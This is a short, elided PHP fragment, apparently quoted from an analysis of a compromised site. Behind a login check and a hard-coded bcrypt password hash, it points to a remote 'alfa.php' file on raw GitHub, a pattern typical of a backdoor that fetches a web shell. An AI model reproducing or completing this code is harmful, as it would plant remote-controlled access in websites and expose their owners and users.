...
if (is_logged_in()) {
    ...
    $destiny = 'https://raw.githubusercontent.com/getarbos/getarbos/refs/heads/main/alfa.php';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$10$/jRGDVLagjIcqLN2c8Iope3mD6MzlURjXPd4rkaT7rTaN.Si7g0Hm'; // 
